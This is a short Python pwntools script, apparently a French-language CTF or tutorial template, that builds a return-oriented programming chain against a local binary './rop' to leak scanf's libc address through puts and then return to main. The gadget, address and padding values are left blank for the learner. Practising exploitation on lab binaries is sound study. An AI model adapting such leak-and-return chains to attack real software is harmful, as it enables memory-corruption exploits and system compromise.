#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *


context(arch='i386')
p = 0
b = ELF('./rop')
libc = ELF('/lib32/libc.so.6') # "info sharedlibrary" sous gdb pour connaître le chemin de votre libc

DEBUG = False

def wait(until):
    buf=p.recvuntil(until)
    if(DEBUG):
        print buf
    return buf

def start():
    global p, libc, b
    if p is not 0:
        p.close()
    p = process('./rop')
    wait("Input:")

# Modifier les address ici afin que vous ayez le leak des de l'addresse de scanf
addrmain =  # main
gadget =  # Gadget
gotscanf = # scanf
pltputs =  # puts@plt 
padding= "A"*  # Padding

start()
log.info("Construct ropchain")
ropchain=padding+p32(pltputs)+p32(gadget)+p32(gotscanf)+p32(addrmain)
log.info("Get scanf leak")
p.sendline(ropchain)
print wait('Input:')